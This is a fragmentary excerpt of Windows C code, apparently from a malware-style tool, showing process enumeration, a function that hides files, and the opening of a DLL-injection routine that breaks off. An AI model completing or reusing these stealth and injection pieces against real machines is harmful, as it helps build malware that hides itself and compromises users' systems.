...
bool getCurrentProcesses(char *buf, int buflen) {
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);
	...
	} while ( strlen(buf) + 51 < buflen && Process32Next(shot, &pe32));
	/* 51 is a day-dream value to avoid overflow */
	CloseHandle(shot);
	return true;
}

bool hideFile(char *path){
	return SetFileAttributes(stringToLPCWSTR(path), FILE_ATTRIBUTE_HIDDEN);
}
...
bool inject(char *injectProcess, char *absolutPathForDll){
	...
	/*	
	DWORD dwHandle,dwID;
	LPVOID pFunc = GetModuleHandleA; // get dll injected handle
